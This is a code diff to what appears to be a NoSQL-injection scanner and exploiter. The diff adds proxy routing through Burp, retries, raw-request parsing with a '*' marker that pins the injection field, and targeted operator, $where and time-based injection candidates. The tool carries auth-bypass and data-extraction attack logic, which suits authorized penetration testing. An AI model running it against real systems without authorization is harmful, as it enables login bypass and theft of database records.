@@ -19,6 +19,7 @@ import random
 import re
 import string
 import time
+import urllib.parse
 
 import requests
 
@@ -79,6 +80,8 @@ def args():
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
         ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
+        ["--proxy", "Route every request through this proxy, e.g. http://127.0.0.1:8080 (Burp)"],
+        ["--retries", "Retries on a transient connection failure, with backoff (default 2)"],
     ]
 
 
@@ -90,13 +93,96 @@ def _rand(n=8):
 # Transport: context (session + CSRF), request builders, probe
 # ---------------------------------------------------------------------------
 
+def _parse_proxy(spec):
+    # "http://127.0.0.1:8080" / "socks5://..." -> requests proxies dict.
+    if not spec:
+        return None
+    return {"http": spec, "https": spec}
+
+
+def parse_raw_request(text, force_ssl=False):
+    # Parse a raw HTTP request (Burp 'Copy to file' / repeater paste) into a
+    # target dict the engine can drive, preserving the real headers/cookies/
+    # Content-Type/body.  A '*' anywhere in a body or query VALUE pins the
+    # injection point; with no marker, every body/query param is enumerated.
+    lines = text.replace("\r\n", "\n").replace("\r", "\n").split("\n")
+    while lines and not lines[0].strip():
+        lines.pop(0)
+    if not lines:
+        raise ValueError("empty request")
+    parts = lines[0].split()
+    method = parts[0].upper()
+    raw_path = parts[1] if len(parts) > 1 else "/"
+
+    headers = {}
+    i = 1
+    while i < len(lines) and lines[i].strip():
+        if ":" in lines[i]:
+            k, v = lines[i].split(":", 1)
+            headers[k.strip()] = v.strip()
+        i += 1
+    body = "\n".join(lines[i + 1:]).strip("\n") if i + 1 < len(lines) else ""
+
+    host = headers.get("Host", "")
+    scheme = "https" if (force_ssl or host.endswith(":443")) else "http"
+    cookies = {}
+    if "Cookie" in headers:
+        for part in headers.pop("Cookie").split(";"):
+            if "=" in part:
+                ck, cv = part.split("=", 1)
+                cookies[ck.strip()] = cv.strip()
+    ctype = headers.get("Content-Type", "").lower()
+    for h in list(headers):                       # drop hop-by-hop / auto headers
+        if h.lower() in ("content-length", "host", "accept-encoding", "connection"):
+            headers.pop(h)
+
+    sp = urllib.parse.urlsplit(raw_path)
+    base_url = "%s://%s%s" % (scheme, host, sp.path or "/")
+
+    inject = []
+
+    def _mark(name, value):
+        if isinstance(value, str) and "*" in value:
+            inject.append(name)
+            return value.replace("*", "")
+        return value
+
+    if "json" in ctype and body:
+        try:
+            obj = _json.loads(body)
+        except ValueError:
+            obj = {}
+        fields = {}
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                sval = v if isinstance(v, str) else _json.dumps(v)
+                fields[k] = _mark(k, sval)
+        vector = "json"
+    elif body:
+        fields = {k: _mark(k, v) for k, v in urllib.parse.parse_qsl(body, keep_blank_values=True)}
+        vector = "form"
+    else:
+        fields = {k: _mark(k, v) for k, v in urllib.parse.parse_qsl(sp.query, keep_blank_values=True)}
+        vector = "form"
+
+    return {
+        "method": method, "base_url": base_url, "headers": headers or None,
+        "cookies": cookies or None, "fields": fields, "vector": vector,
+        "vectors": [vector], "inject_fields": inject or None,
+    }
+
+
 class Ctx:
-    def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None):
+    def __init__(self, headers=None, verify=False, csrf=None, timeout=15, session=None,
+                 proxies=None, retries=2, cookies=None):
         self.session = session or requests.Session()
         self.headers = headers
         self.verify = verify
         self.csrf = csrf          # {"field","url","regex"} or None
         self.timeout = timeout
+        self.proxies = proxies    # {"http":.., "https":..} or None (e.g. route via Burp)
+        self.retries = retries    # transient-failure retries with backoff
+        self.cookies = cookies    # dict of cookies sent on every request
 
 
 class Probe:
@@ -182,16 +268,25 @@ def _send(ctx, method, url, vector, fields):
         token = _fetch_csrf(ctx)
         if token is not None:
             fields[ctx.csrf["field"]] = ("lit", token)
-    kw = dict(headers=ctx.headers, allow_redirects=False, verify=ctx.verify, timeout=ctx.timeout)
+    kw = dict(headers=ctx.headers, allow_redirects=False, verify=ctx.verify,
+              timeout=ctx.timeout, proxies=ctx.proxies, cookies=ctx.cookies)
     if method == "GET":
         kw["params"] = _build_form(fields)
     elif vector == "json":
         kw["json"] = _build_json(fields)
     else:
         kw["data"] = _build_form(fields)
-    start = time.time()
-    resp = ctx.session.request(method, url, **kw)
-    return Probe(resp, time.time() - start)
+    last = None
+    for attempt in range(max(1, ctx.retries + 1)):
+        try:
+            start = time.time()                  # timed only on the attempt that succeeds,
+            resp = ctx.session.request(method, url, **kw)   # so backoff never pollutes timing
+            return Probe(resp, time.time() - start)
+        except requests.RequestException as e:
+            last = e
+            if attempt < ctx.retries:
+                time.sleep(min(2.0, 0.3 * (attempt + 1)))
+    raise last
 
 
 # ---------------------------------------------------------------------------
@@ -317,27 +412,30 @@ def _resolve_ops(opdict):
     return {k: _resolve(v) for k, v in opdict.items()}
 
 
-def _candidates(fields_literal):
+def _candidates(fields_literal, inject_fields=None):
     names = list(fields_literal.keys())
     cands = []
-    # A) auth-bypass: always-true operator on EVERY field at once.
-    for lbl, od in _op_specs():
-        spec = {n: ("ops", _resolve_ops(od)) for n in names}
-        cands.append(("all-fields %s" % lbl, spec, None))
-    # B) single-field operator (data endpoints like ?id=5 -> id[$ne]).
-    if len(names) > 1:
-        for f in names:
-            for lbl, od in _op_specs():
-                spec = {n: ("lit", fields_literal[n]) for n in names}
-                spec[f] = ("ops", _resolve_ops(od))
-                cands.append(("%s %s" % (f, lbl), spec, None))
+    # A) auth-bypass: always-true operator on EVERY field at once -- only when
+    #    auto-enumerating; a pinned '*' marker means "inject exactly here".
+    if not inject_fields:
+        for lbl, od in _op_specs():
+            spec = {n: ("ops", _resolve_ops(od)) for n in names}
+            cands.append(("all-fields %s" % lbl, spec, None))
+    # B) single-field operator (data endpoints like ?id=5 -> id[$ne], or marker).
+    targets = inject_fields or (names if len(names) > 1 else [])
+    for f in targets:
+        for lbl, od in _op_specs():
+            spec = {n: ("lit", fields_literal[n]) for n in names}
+            spec[f] = ("ops", _resolve_ops(od))
+            cands.append(("%s %s" % (f, lbl), spec, None))
     return cands
 
 
-def _where_candidates(fields_literal):
+def _where_candidates(fields_literal, inject_fields=None):
     names = list(fields_literal.keys())
+    targets = inject_fields or names
     cands = []
-    for f in names:
+    for f in targets:
         for tlabel, tmpl in _WHERE_TEMPLATES:
             spec = {n: ("lit", fields_literal[n]) for n in names}
             spec[f] = ("lit", tmpl % "true")
@@ -346,11 +444,13 @@ def _where_candidates(fields_literal):
 
 
 def detect(base_url, method, fields_literal, headers=None, verify=False,
-           csrf=None, no_where=False, ctx=None, time_based="auto", delay_ms=1000):
+           csrf=None, no_where=False, ctx=None, time_based="auto", delay_ms=1000,
+           inject_fields=None, vectors=None):
     method = method.upper()
     if ctx is None:
         ctx = Ctx(headers, verify, csrf)
-    vectors = ["form"] if method == "GET" else ["form", "json"]
+    if vectors is None:
+        vectors = ["form"] if method == "GET" else ["form", "json"]
     findings = []
 
     for vector in vectors:
@@ -362,9 +462,9 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
             continue
         noise = Noise(falses)
 
-        cands = _candidates(fields_literal)
+        cands = _candidates(fields_literal, inject_fields)
         if not no_where:
-            cands = cands + _where_candidates(fields_literal)
+            cands = cands + _where_candidates(fields_literal, inject_fields)
 
         for label, spec, meta in cands:
             try:
@@ -395,7 +495,7 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
     has_where = any(f["strong"] and isinstance(f.get("where"), dict) and not f["where"].get("time")
                     for f in findings)
     if not no_where and (time_based == "y" or (time_based == "auto" and not has_where)):
-        findings += _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms)
+        findings += _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields)
     return findings
 
 
@@ -807,10 +907,11 @@ def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
     return []
 
 
-def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms):
+def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields=None):
     # Confirm a $where injection purely by response time: inject an unconditional
     # delay; if it slows (and a no-delay control stays fast), it's time-based.
     secs = delay_ms / 1000.0
+    targets = inject_fields or list(fields_literal)
     for vector in vectors:
         try:
             base = [_send(ctx, method, base_url, vector,
@@ -818,7 +919,7 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms):
         except requests.RequestException:
             continue
         thr = max(base) + secs * 0.5
-        for field in fields_literal:
+        for field in targets:
             for tlabel, tmpl in _WHERE_TEMPLATES:
                 for elabel, efmt in _DELAY_EXPRS:
                     spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
@@ -1020,13 +1121,16 @@ def _maybe_extract(strong, findings, base_url, method, fields_literal, ctx, args
                 print("    %s = %s" % (k, rec.get(k)))
 
 
-def run(base_url, method, fields_literal, headers=None, verify=False, args=None):
+def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
+        cookies=None, inject_fields=None, vectors=None):
     fields_literal = dict(fields_literal)
     csrf = None
     no_where = False
     ext_method = "auto"
     time_based = "auto"
     delay_ms = 1000
+    proxy = None
+    retries = 2
     if args is not None:
         cf = getattr(args, "csrfField", None)
         if cf:
@@ -1039,6 +1143,11 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             delay_ms = int(getattr(args, "timeDelay", None) or 1000)
         except (ValueError, TypeError):
             delay_ms = 1000
+        proxy = _parse_proxy(getattr(args, "proxy", None))
+        try:
+            retries = int(getattr(args, "retries", None) or 2)
+        except (ValueError, TypeError):
+            retries = 2
 
     if csrf:
         fields_literal.pop(csrf["field"], None)
@@ -1047,6 +1156,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
     print("=================================================================")
     print("Target: %s [%s]" % (base_url, method.upper()))
     print("Fields: %s" % (", ".join(fields_literal.keys()) or "(none)"))
+    if inject_fields:
+        print("Inject: %s (pinned marker)" % ", ".join(inject_fields))
     if csrf:
         print("CSRF  : carrying '%s' from %s on every request" % (csrf["field"], csrf["url"]))
     print("")
@@ -1057,9 +1168,11 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None)
             input("\nPress enter to continue...")
         return []
 
-    ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5))
+    ctx = Ctx(headers, verify, csrf, timeout=max(15, int(delay_ms / 1000 * 5) + 5),
+              proxies=proxy, retries=retries, cookies=cookies)
     findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
-                      time_based=time_based, delay_ms=delay_ms)
+                      time_based=time_based, delay_ms=delay_ms,
+                      inject_fields=inject_fields, vectors=vectors)
 
     print("")
     strong_all = [f for f in findings if f["strong"]]
